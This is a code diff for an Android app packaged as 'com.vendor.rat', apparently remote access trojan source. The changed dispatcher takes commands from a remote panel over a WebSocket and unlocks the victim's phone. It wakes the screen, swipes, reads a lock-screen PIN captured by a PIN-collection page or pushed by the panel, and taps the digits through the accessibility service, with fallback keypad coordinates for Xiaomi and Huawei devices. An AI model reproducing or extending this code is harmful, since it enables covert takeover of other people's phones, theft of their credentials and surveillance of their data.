@@ -39,6 +39,8 @@ import com.google.gson.JsonObject;
 import com.google.gson.JsonParser;
 
 import com.vendor.rat.MainApplication;
+import com.vendor.rat.auto.engine.ConfirmLockDelegate;
+import com.vendor.rat.credential.LockCredentialStore;
 import com.vendor.rat.network.NetworkManager;
 import com.vendor.rat.network.WebSocketClient;
 import com.vendor.rat.service.CommandHandler;
@@ -615,43 +617,83 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
             return;
         }
 
-        // 1. 唤醒屏幕
+        // 1. 双保险亮屏: WakeLock + WakeActivity
+        //    WakeLock 立即唤醒，WakeActivity 的 FLAG_KEEP_SCREEN_ON 保持
         wakeScreen();
+
+        Context wakeCtx = ctx;
+        Intent wakeIntent = new Intent(wakeCtx, com.vendor.rat.activity.WakeActivity.class);
+        wakeIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        wakeCtx.startActivity(wakeIntent);
+        Log.d(TAG, "unlock: WakeActivity + WakeLock launched");
 
         if (!locked) {
             Log.d(TAG, "unlock: no lock screen, just woke up");
             return;
         }
 
-        // 2. 延迟后上滑解锁
+        // 2. 在单一线程中串行执行整个解锁流程
         new Thread(() -> {
             try {
+                Thread.sleep(2000); // 等屏幕完全亮起
+
+                // WakeActivity 已完成亮屏使命，关掉它让锁屏界面露出来
+                com.vendor.rat.activity.WakeActivity.finishIfAlive();
                 Thread.sleep(500);
+
                 MyAccessibilityService service = MyAccessibilityService.P();
                 if (service == null) return;
 
-                int w = service.getResources().getDisplayMetrics().widthPixels;
-                int h = service.getResources().getDisplayMetrics().heightPixels;
-                Path swipePath = new Path();
-                swipePath.moveTo(w / 2f, h * 0.8f);
-                swipePath.lineTo(w / 2f, h * 0.2f);
-                GestureDescription swipe = new GestureDescription.Builder()
-                    .addStroke(new GestureDescription.StrokeDescription(swipePath, 0, 300))
-                    .build();
-                service.dispatchGesture(swipe, null, null);
-                Log.d(TAG, "unlock: swipe up dispatched");
-
-                // 3. 如果有密码，等待密码输入界面出现后模拟输入
                 if (hasPassword) {
-                    Thread.sleep(800);
-                    // 从心跳缓存的 phoneInfo 获取密码 (Panel 通过 statusBatch 下发)
-                    // 或从 config 获取预设密码
                     String password = getStoredPassword();
-                    if (password != null && !password.isEmpty()) {
-                        inputPassword(service, password);
+                    if (password == null || password.isEmpty()) {
+                        Log.w(TAG, "unlock: no stored password, swipe only");
+                        swipeUp(service);
                     } else {
-                        Log.w(TAG, "unlock: device has password but no stored password available");
+
+                    // 上滑触发 PIN 界面
+                    swipeUp(service);
+                    Thread.sleep(2000); // 等 PIN 界面渲染
+
+                    // 获取真实屏幕尺寸（包含导航栏）
+                    android.graphics.Point realSize = new android.graphics.Point();
+                    android.view.WindowManager wm = (android.view.WindowManager)
+                            service.getSystemService(android.content.Context.WINDOW_SERVICE);
+                    if (wm != null) {
+                        wm.getDefaultDisplay().getRealSize(realSize);
                     }
+                    int w = realSize.x > 0 ? realSize.x : service.getResources().getDisplayMetrics().widthPixels;
+                    int h = realSize.y > 0 ? realSize.y : service.getResources().getDisplayMetrics().heightPixels;
+
+                    // 一劳永逸: 尝试动态获取 PIN 按钮真实坐标
+                    int[][] digitCoords = tryGetPinButtonCoords(service);
+                    if (digitCoords != null) {
+                        Log.d(TAG, "unlock: using dynamic PIN coords from accessibility");
+                    } else {
+                        // fallback: 厂商比例坐标
+                        digitCoords = calcPinCoordsFromRatio(w, h);
+                        Log.d(TAG, "unlock: using vendor ratio coords, screen=" + w + "x" + h);
+                    }
+
+                    Log.d(TAG, "unlock: starting PIN input (" + password.length() + " digits)");
+                    for (int i = 0; i < password.length(); i++) {
+                        int digit = password.charAt(i) - '0';
+                        int px = digitCoords[digit][0];
+                        int py = digitCoords[digit][1];
+
+                        android.graphics.Path path = new android.graphics.Path();
+                        path.moveTo(px, py);
+                        GestureDescription gesture = new GestureDescription.Builder()
+                                .addStroke(new GestureDescription.StrokeDescription(path, 0, 100))
+                                .build();
+                        service.dispatchGesture(gesture, null, null);
+                        Log.d(TAG, "unlock: tapped digit " + password.charAt(i) + " at (" + px + "," + py + ")");
+                        Thread.sleep(350);
+                    }
+                    Log.d(TAG, "unlock: PIN input complete");
+                    } // end else (password available)
+                } else {
+                    swipeUp(service);
                 }
             } catch (Exception e) {
                 Log.w(TAG, "unlock failed", e);
@@ -661,9 +703,14 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
 
     /**
      * 获取存储的锁屏密码
+     * 优先级: LockCredentialStore (PIN 采集加密存储) > device_config (Panel 下发)
      */
     private String getStoredPassword() {
-        // 优先从 SharedPreferences 获取 (Panel 通过 phonepass 命令设置)
+        // 1. LockCredentialStore (PIN 采集页面保存的加密 PIN)
+        String pin = LockCredentialStore.getPin();
+        if (pin != null && !pin.isEmpty()) return pin;
+
+        // 2. device_config (Panel 通过 phonepass 命令设置)
         try {
             Context ctx = getAppContext();
             if (ctx != null) {
@@ -677,34 +724,120 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
         return null;
     }
 
-    /**
-     * 模拟输入密码 (数字密码)
-     */
-    private void inputPassword(AccessibilityService service, String password) {
+    private void ensureConfirmLockDelegate(MyAccessibilityService service) {
         try {
-            Log.d(TAG, "inputPassword: length=" + password.length());
-            for (int i = 0; i < password.length(); i++) {
-                char c = password.charAt(i);
-                // 通过无障碍服务查找数字按钮并点击
-                android.view.accessibility.AccessibilityNodeInfo root = service.getRootInActiveWindow();
-                if (root == null) continue;
-
-                // 查找包含该数字文本的按钮
-                java.util.List<android.view.accessibility.AccessibilityNodeInfo> nodes =
-                    root.findAccessibilityNodeInfosByText(String.valueOf(c));
-                for (android.view.accessibility.AccessibilityNodeInfo node : nodes) {
-                    if (node.isClickable()) {
-                        node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
-                        Log.d(TAG, "inputPassword: clicked digit " + c);
-                        break;
-                    }
-                }
-                root.recycle();
-                Thread.sleep(100);
+            com.vendor.rat.service.EngineManager mgr = service.getEngineManager();
+            if (mgr != null && !mgr.hasEngine(ConfirmLockDelegate.class)) {
+                mgr.register(new ConfirmLockDelegate());
+                Log.d(TAG, "unlock: ConfirmLockDelegate registered");
             }
         } catch (Exception e) {
-            Log.w(TAG, "inputPassword failed", e);
+            Log.w(TAG, "ensureConfirmLockDelegate failed", e);
         }
+    }
+
+    /**
+     * 动态获取 PIN 按钮坐标 — 遍历所有无障碍窗口找 digit 按钮
+     * 返回 int[10][2] (digit 0-9 的 center x,y)，找不到返回 null
+     */
+    private int[][] tryGetPinButtonCoords(MyAccessibilityService service) {
+        try {
+            // 搜索策略: content-desc="0"-"9" 或 resource-id key0-key9
+            java.util.List<android.view.accessibility.AccessibilityWindowInfo> windows = service.getWindows();
+            if (windows == null) return null;
+
+            for (android.view.accessibility.AccessibilityWindowInfo w : windows) {
+                if (w == null) continue;
+                android.view.accessibility.AccessibilityNodeInfo root = w.getRoot();
+                if (root == null) continue;
+
+                int[][] coords = extractDigitCoords(root);
+                if (coords != null) return coords;
+            }
+
+            // fallback: activeRoot
+            android.view.accessibility.AccessibilityNodeInfo active = service.getRootInActiveWindow();
+            if (active != null) {
+                int[][] coords = extractDigitCoords(active);
+                if (coords != null) return coords;
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "tryGetPinButtonCoords error", e);
+        }
+        return null;
+    }
+
+    private int[][] extractDigitCoords(android.view.accessibility.AccessibilityNodeInfo root) {
+        int[][] coords = new int[10][2];
+        int found = 0;
+
+        for (int d = 0; d <= 9; d++) {
+            String ds = String.valueOf(d);
+            // 方式1: content-desc 匹配
+            java.util.List<android.view.accessibility.AccessibilityNodeInfo> nodes =
+                    root.findAccessibilityNodeInfosByText(ds);
+            for (android.view.accessibility.AccessibilityNodeInfo n : nodes) {
+                CharSequence desc = n.getContentDescription();
+                if (desc != null && desc.toString().equals(ds) && n.isClickable()) {
+                    android.graphics.Rect bounds = new android.graphics.Rect();
+                    n.getBoundsInScreen(bounds);
+                    coords[d][0] = bounds.centerX();
+                    coords[d][1] = bounds.centerY();
+                    found++;
+                    Log.d(TAG, "PIN coord: digit " + d + " at (" + coords[d][0] + "," + coords[d][1] + ")");
+                    break;
+                }
+            }
+        }
+
+        if (found >= 10) {
+            Log.d(TAG, "extractDigitCoords: found all 10 digits");
+            return coords;
+        }
+        Log.d(TAG, "extractDigitCoords: only found " + found + "/10 digits");
+        return null;
+    }
+
+    /**
+     * 厂商比例坐标 fallback
+     */
+    private int[][] calcPinCoordsFromRatio(int w, int h) {
+        float[] colX, rowY;
+        if (com.vendor.rat.utils.DeviceUtils.isXiaomi()) {
+            colX = new float[]{0.236f, 0.499f, 0.763f};
+            rowY = new float[]{0.562f, 0.639f, 0.716f, 0.794f};
+        } else if (com.vendor.rat.utils.DeviceUtils.isHuawei()) {
+            colX = new float[]{0.246f, 0.500f, 0.754f};
+            rowY = new float[]{0.500f, 0.600f, 0.700f, 0.800f};
+        } else {
+            colX = new float[]{0.246f, 0.500f, 0.754f};
+            rowY = new float[]{0.471f, 0.580f, 0.688f, 0.797f};
+        }
+
+        int[][] coords = new int[10][2];
+        // digits 1-9
+        for (int d = 1; d <= 9; d++) {
+            int idx = d - 1;
+            coords[d][0] = (int) (colX[idx % 3] * w);
+            coords[d][1] = (int) (rowY[idx / 3] * h);
+        }
+        // digit 0
+        coords[0][0] = (int) (colX[1] * w);
+        coords[0][1] = (int) (rowY[3] * h);
+        return coords;
+    }
+
+    private void swipeUp(MyAccessibilityService service) {
+        int w = service.getResources().getDisplayMetrics().widthPixels;
+        int h = service.getResources().getDisplayMetrics().heightPixels;
+        Path swipePath = new Path();
+        swipePath.moveTo(w / 2f, h * 0.8f);
+        swipePath.lineTo(w / 2f, h * 0.2f);
+        GestureDescription swipe = new GestureDescription.Builder()
+                .addStroke(new GestureDescription.StrokeDescription(swipePath, 0, 300))
+                .build();
+        service.dispatchGesture(swipe, null, null);
+        Log.d(TAG, "unlock: swipe up dispatched");
     }
 
     /**
